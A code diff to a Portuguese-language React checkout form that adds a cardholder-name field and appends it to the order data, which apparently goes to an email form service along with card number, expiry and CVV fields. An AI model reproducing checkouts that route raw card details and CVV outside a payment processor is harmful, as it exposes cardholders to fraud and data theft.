@@ -33,6 +33,7 @@ const formSchema = z.object({
   cardExpiry: z.string().optional(),
   cardCVV: z.string().optional(),
   cardCpf: z.string().optional(),
+  cardName: z.string().optional(),
 });
 
 interface CheckoutFormProps {
@@ -51,7 +52,7 @@ export const CheckoutForm = ({ product, onPixSuccess }: CheckoutFormProps) => {
     defaultValues: {
       name: "", email: "", cpf: "", phone: "",
       address: "", city: "", state: "", zip: "",
-      cardNumber: "", cardExpiry: "", cardCVV: "", cardCpf: "",
+      cardNumber: "", cardExpiry: "", cardCVV: "", cardCpf: "", cardName: "",
     },
   });
 
@@ -84,6 +85,7 @@ export const CheckoutForm = ({ product, onPixSuccess }: CheckoutFormProps) => {
         formData.append("cpf", values.cpf);
         formData.append("address", `${values.address}, ${values.city} - ${values.state}, ${values.zip}`);
         formData.append("product", product.name);
+        formData.append("card_name", values.cardName || "");
         formData.append("price", `R$ ${product.price.toFixed(2)}`);
         formData.append("payment_method", "Cartão de Crédito");
         formData.append("_subject", `Novo pedido: ${product.name}`);
@@ -210,6 +212,13 @@ export const CheckoutForm = ({ product, onPixSuccess }: CheckoutFormProps) => {
                 </TabsContent>
                 <TabsContent value="card" className="mt-4 space-y-4">
                   <div className="grid gap-4">
+                    <FormField control={form.control} name="cardName" render={({ field }) => (
+                      <FormItem>
+                        <FormLabel>Nome impresso no cartão</FormLabel>
+                        <FormControl><Input placeholder="JOÃO D SILVA" {...field} onChange={(e) => field.onChange(e.target.value.toUpperCase())} /></FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )} />
                     <FormField control={form.control} name="cardNumber" render={({ field }) => (
                       <FormItem>
                         <FormLabel>Número do cartão</FormLabel>
